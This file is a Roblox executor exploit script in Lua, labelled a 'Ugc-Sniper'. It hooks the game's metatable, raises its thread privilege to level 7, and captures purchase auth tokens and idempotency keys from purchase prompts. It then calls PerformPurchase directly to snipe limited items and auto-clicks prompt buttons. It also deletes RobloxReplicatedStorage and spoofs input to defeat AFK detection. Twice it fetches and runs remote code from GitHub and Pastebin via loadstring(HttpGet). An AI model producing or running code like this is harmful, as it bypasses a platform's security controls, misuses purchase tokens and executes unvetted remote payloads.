local LOAD_TIME = tick()
local queueonteleport = queue_on_teleport or queueonteleport
local setclipboard = toclipboard or setrbxclipboard or setclipboard
local clonefunction = clonefunc or clonefunction
local hookfunction =
	hookfunc or replacecclosure or detourfunction or replacefunc or replacefunction or replaceclosure or detour_function or
	hookfunction
local setthreadidentity = set_thread_identity or setthreadcaps or setthreadidentity
local firetouchinterests = fire_touch_interests or firetouchinterests
local getnamecallmethod = get_namecall_method or getnamecallmethod
local setnamecallmethod = set_namecall_method or setnamecallmethod
local restorefunction = restorefunction or restoreclosure or restorefunc

local a = Instance.new("Part")
for b, c in pairs(getreg()) do
	if type(c) == "table" and #c then
		if rawget(c, "__mode") == "kvs" then
			for d, e in pairs(c) do
				if e == a then
					getgenv().InstanceList = c;
					break
				end
			end
		end
	end
end
local f = {}
function f.invalidate(g)
	if not InstanceList then
		return
	end
	for b, c in pairs(InstanceList) do
		if c == g then
			InstanceList[b] = nil;
			return g
		end
	end
end
if not cloneref then
	getgenv().cloneref = f.invalidate
end

getrenv().Visit = cloneref(game:GetService("Visit"))
getrenv().MarketplaceService = cloneref(game:GetService("MarketplaceService"))
getrenv().HttpRbxApiService = cloneref(game:GetService("HttpRbxApiService"))
getrenv().HttpService = cloneref(game:GetService("HttpService"))
local CoreGui = cloneref(game:GetService("CoreGui"))
local ContentProvider = cloneref(game:GetService("ContentProvider"))
local RunService = cloneref(game:GetService("RunService"))
local Stats = cloneref(game:GetService("Stats"))
local Players = cloneref(game:GetService("Players"))
local NetworkClient = cloneref(game:GetService("NetworkClient"))
local VirtualUser = cloneref(game:GetService("VirtualUser"))
local ProximityPromptService = cloneref(game:GetService("ProximityPromptService"))
local Lighting = cloneref(game:GetService("Lighting"))
local AssetService = cloneref(game:GetService("AssetService"))
local TeleportService = cloneref(game:GetService("TeleportService"))
local NetworkSettings = settings().Network
local UserGameSettings = UserSettings():GetService("UserGameSettings")
getrenv().getgenv = clonefunction(getgenv)

getgenv().stealth_call = function(script)
	getrenv()._set = clonefunction(setthreadidentity)
	local old
	old = hookmetamethod(game, "__index", function(a, b)
		task.spawn(function()
			_set(7)
			task.wait(0.1)
			local went, error = pcall(function()
				loadstring(script)()
			end)
			print(went, error)
			if went then
				local check = Instance.new("LocalScript")
				check.Parent = Visit
			end
		end)
		hookmetamethod(game, "__index", old)
		return old(a, b)
	end)
end

local function touch(x)
	x = x:FindFirstAncestorWhichIsA("Part")
	if x then
		if firetouchinterest then
			task.spawn(function()
				firetouchinterest(x, Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart"), 1)
				wait()
				firetouchinterest(x, Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart"), 0)
			end)
		end
		x.CFrame = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
	end
end

for i, v in pairs(game.RobloxReplicatedStorage:GetDescendants()) do
	pcall(function()
		v:Destroy()
	end)
end

			task.spawn(function()	
                local discord = loadstring(game:HttpGet("https://raw.githubusercontent.com/diaslo/EgorchikHichimiroProject/main/discord.lua",true))()
                local win = discord:Window("Created By Egor")
                local serv = win:Server("Ugc-Sniper", "rbxassetid://0")
                local main = serv:Channel("Main")
				main:Toggle("Start Snipe", false, function(bool)
					if bool then
						getrenv()._set = clonefunction(setthreadidentity)
						local old
						old = hookmetamethod(game, "__index", function(a, b)
							task.spawn(function()
								_set(7)
								task.wait()
								getgenv().promptpurchaserequestedv2 = MarketplaceService.PromptPurchaseRequestedV2:Connect(
								function(...)
									local startTime = tick()
									t = {...}
									local assetId = t[2]
									local idempotencyKey = t[5]
									local purchaseAuthToken = t[6]
									local info = MarketplaceService:GetProductInfo(assetId)
									local productId = info.ProductId
									local price = info.PriceInRobux
									local collectibleItemId = info.CollectibleItemId
									local collectibleProductId = info.CollectibleProductId
									print("Double checking if we got the right info...")
									print("PurchaseAuthToken: " .. purchaseAuthToken)
									print("IdempotencyKey: " .. idempotencyKey)
									print("CollectibleItemId: " .. collectibleItemId)
									print("CollectibleProductId: " .. collectibleProductId)
									print("ProductId (SHOULD BE 0): " .. productId)
									print("Price: " .. price)
									print("-------------------------------------------------------")
									warn("FIRST PURCHASE ATTEMPT")
									for i, v in pairs(MarketplaceService:PerformPurchase(Enum.InfoType.Asset, productId, price,
										tostring(game:GetService("HttpService"):GenerateGUID(false)), true, collectibleItemId,
										collectibleProductId, idempotencyKey, tostring(purchaseAuthToken))) do
										print(i, v)
									end
									local endTime = tick()
									local duration = 0
									print("Bought Item! Took " .. tostring(duration) .. " seconds")
									local input = loadstring(game:HttpGet('https://pastebin.com/raw/dYzQv3d8'))()
									input.press(Enum.KeyCode.F9)
								end)
							end)
							hookmetamethod(game, "__index", old)
							return old(a, b)
						end)
					else
						getgenv().promptpurchaserequestedv2:Disconnect()
					end
				end)

				local ClickingSpeed = 0
				local loopActive = false

				main:Toggle("Auto Cancel", false, function(bool)

					loopActive = bool

                                         if loopActive then
						while loopActive == true do
							local purchasePrompt = game.CoreGui:FindFirstChild("PurchasePrompt")
							if purchasePrompt then
								local productPurchaseContainer = purchasePrompt:FindFirstChild("ProductPurchaseContainer")
								if productPurchaseContainer then
									local animator = productPurchaseContainer:FindFirstChild("Animator")
									if animator then
										local prompt = animator:FindFirstChild("Prompt")
										if prompt and 
											prompt:FindFirstChild("AlertContents") and
											prompt.AlertContents:FindFirstChild("Footer") and
											prompt.AlertContents.Footer:FindFirstChild("Buttons") then

											for _, button in ipairs(prompt.AlertContents.Footer.Buttons:GetChildren()) do
												if button:FindFirstChild("ButtonContent") and
													button.ButtonContent:FindFirstChild("ButtonMiddleContent") and
													button.ButtonContent.ButtonMiddleContent:FindFirstChildOfClass("TextLabel") and
													button.ButtonContent.ButtonMiddleContent:FindFirstChildOfClass("TextLabel").Text == "Cancel" then

													local pos = button.AbsolutePosition
													print(pos)

													for _, v in ipairs(prompt.AlertContents.Footer.Buttons:GetChildren()) do
														print(v.Name)
													end

													game:GetService("VirtualInputManager"):SendMouseButtonEvent(pos.X + button.AbsoluteSize.X / 2, pos.Y + button.AbsoluteSize.Y, 0, true, game, 1)
													wait()
													game:GetService("VirtualInputManager"):SendMouseButtonEvent(pos.X + button.AbsoluteSize.X / 2, pos.Y + button.AbsoluteSize.Y, 0, false, game, 1)
												end
											end
										end
									end
								end
							end
							wait(0)
							if loopActive == false then
								break
							end
						end
					end
				end)


local actic = false

				main:Toggle("Auto Close Error", false, function(bool)
					actic = bool
	if actic then
		while actic do
			local pp = game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator:FindFirstChild("Prompt")
			if pp and pp.AlertContents and pp.AlertContents.Footer and pp.AlertContents.Footer.Buttons and not pp.AlertContents.Footer.Buttons:FindFirstChild("2") then
				if pp.AlertContents.Footer.Buttons:FindFirstChild("1") then
					local b1 = pp.AlertContents.Footer.Buttons[1].AbsolutePosition
					game:GetService("VirtualInputManager"):SendMouseButtonEvent(b1.X + 55, b1.Y + 65.5, 0, true, game, 1)
					wait()
					game:GetService("VirtualInputManager"):SendMouseButtonEvent(b1.X + 55, b1.Y + 65.5, 0, false, game, 1)
				end
			end
			wait()
			
			if actic == false then
				break
			end
			
		end
	end
end)
				main:Toggle("Anti Afk", false, function(bool)
					if bool == true then
						Players.LocalPlayer.Idled:connect(function()
							VirtualUser:CaptureController()
							VirtualUser:ClickButton2(Vector2.new())
						end)
					end
				end)
				local signal
				players:Seperator()
			end)
